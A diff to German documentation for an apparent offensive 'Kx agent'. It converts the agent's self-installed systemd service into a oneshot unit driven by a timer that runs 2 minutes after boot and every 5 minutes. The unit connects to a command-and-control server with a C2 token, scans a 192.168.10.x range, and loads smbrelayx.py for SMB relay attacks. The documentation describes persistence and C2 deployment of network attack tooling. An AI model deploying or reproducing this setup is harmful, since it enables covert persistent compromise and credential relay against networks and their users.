@@ -845,34 +845,59 @@ dass eines generiert wurde.
 
 ### 8.3 Der Agent als Dienst
 
-Der Agent schreibt beim Start seine eigene systemd-Unit:
+Der Agent schreibt beim Start seine eigene systemd-Unit und einen Timer. Der
+Agent ist ein **Einmal-Lauf**: er scannt, meldet und endet. Den Takt gibt der
+Timer — eine Unit mit `Restart=always` startet den linear endenden Agenten
+sofort wieder (das war ISSUE-20).
 
 ```ini
 # /etc/systemd/system/kx-agent.service (automatisch erzeugt)
 [Unit]
-Description=Kx Agent
+Description=Kx persistent agent (kx-agent)
 After=network-online.target
 
 [Service]
-Type=simple
+Type=oneshot
 EnvironmentFile=/etc/kx/kx-agent.env
-ExecStart=/tmp/kx-agent --server https://… --token ${KX_C2_TOKEN} \
+WorkingDirectory=/usr/local/bin
+ExecStart=/usr/local/bin/kx-agent --server https://… --token ${KX_C2_TOKEN} \
   --server-cert /etc/kx/kx-server.pem --iface eth0 \
-  --start 192.168.10.1 --end 192.168.10.50 --own-ip 192.168.10.1
-Restart=always
-RestartSec=30
+  --start 192.168.10.1 --end 192.168.10.50 --own-ip 192.168.10.1 \
+  --relay-script /usr/local/bin/assets/smbrelayx.py
+Restart=no
 
 [Install]
-WantedBy=multi-user.target
+WantedBy=kx-agent.timer
+
+# /etc/systemd/system/kx-agent.timer (automatisch erzeugt)
+[Unit]
+Description=Kx persistent agent timer (kx-agent)
+After=network-online.target
+
+[Timer]
+OnBootSec=2min
+OnUnitActiveSec=5min
+Persistent=true
+Unit=kx-agent.service
+
+[Install]
+WantedBy=timers.target
 ```
 
 Das Token steht in `/etc/kx/kx-agent.env` (Modus 0600), nicht in der Unit. Die
-Unit enthält alle Pflichtargumente — ohne sie startet der Dienst in einer
-Neustartschleife (das war ISSUE-10).
+Unit enthält alle Pflichtargumente — ohne sie startet der Dienst nicht (das
+war ISSUE-10). `WorkingDirectory` zeigt auf das Verzeichnis des Binaries: das
+Asset `smbrelayx.py` liegt daneben, ein relativer Pfad würde sich unter
+systemd gegen `/` auflösen.
+
+Die Unit-Datei wird nur geschrieben, wenn sich ihr Inhalt ändert. Eigene
+Änderungen an der Unit gehören deshalb in ein Drop-in
+(`/etc/systemd/system/kx-agent.service.d/override.conf`) — das schreibt der
+Agent nicht an.
 
 ```bash
 systemctl daemon-reload
-systemctl enable --now kx-agent
+systemctl enable --now kx-agent.timer
 journalctl -u kx-agent -f
 ```
 
